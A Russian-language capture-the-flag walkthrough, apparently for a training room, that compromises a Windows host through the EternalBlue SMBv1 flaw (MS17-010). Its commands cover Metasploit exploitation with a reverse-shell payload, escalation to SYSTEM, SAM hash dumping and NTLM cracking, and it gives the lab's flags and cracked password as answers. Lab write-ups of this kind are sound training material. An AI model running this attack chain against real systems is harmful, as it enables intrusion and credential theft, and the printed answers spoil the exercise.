## Вводные данные
- **Цель**: Получить доступ к Windows-машине, используя распространенные ошибки конфигурации.
- **Уязвимость**: SMBv1 RCE (EternalBlue).
- **Инструменты**: Nmap, Metasploit, John the Ripper.
---
## 1. Разведка (Recon)
Сканирование целевого хоста для выявления открытых портов и уязвимостей.
```
nmap -sV -sC --script vuln -p- <TARGET_IP>
```

Ответ:
- Открытые порты: <mark style="background: #BBFABBA6;">3</mark>
- Выявленная уязвимость: <mark style="background: #BBFABBA6;">ms17-010</mark>

## 2. Получение доступа (Gain Access)

Инициализация эксплойта EternalBlue через Metasploit.
```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS <TARGET_IP>
msf6 > set payload windows/x64/shell/reverse_tcp
msf6 > run
# далее cntrl+Z для перехода сессии в фон
```
## 3. Эскалация привилегий (Escalate)

Преобразование стандартной оболочки в сессию Meterpreter для удобства постэксплуатации.
```
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 > set SESSION 1
msf6 > run
msf6 > sessions -i 2
```
Проверка и закрепление привилегий `SYSTEM`:
```
meterpreter > getsystem
meterpreter > ps
meterpreter > migrate <PID_процесса_SYSTEM>  # Например, 4 (System) или 600 (services.exe)
```
## 4. Взлом хешей (Cracking)

Извлечение хешей паролей из SAM-базы данных и их локальный подбор.
```
meterpreter > hashdump
```
**Результат `hashdump`**:

- Пользователь: **Jon**
- NTLM-хеш: <mark style="background: #BBFABBA6;">ffb43f0de35be4d9917ac0cc8ad57f8d</mark>
Сохраняем хеш в файл и запускаем подбор через `hashcat` (или `john`):
```
echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > hash.txt
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
**Результат подбора**: <mark style="background: #BBFABBA6;">alqfna22</mark>
## 5. Поиск флагов (Find Flags)

Использование встроенных команд Meterpreter для локализации артефактов.
### Flag 1: Системный корень
```
meterpreter > cd C:/
meterpreter > cat flag1.txt
```
- **Ответ**: <mark style="background: #BBFABBA6;">flag{access_the_machine}</mark>
### Flag 2: Хранилище паролей Windows
```
meterpreter > cd C:/Windows/System32/config
meterpreter > cat flag2.txt
```
- **Ответ**: <mark style="background: #BBFABBA6;">flag{sam_database_elevated_access}</mark>
### Flag 3: Документы администратора
```
meterpreter > cd C:/Users/Jon/Documents
meterpreter > cat flag3.txt
```
- **Ответ**: <mark style="background: #BBFABBA6;">flag{admin_documents_can_be_valuable}</mark>
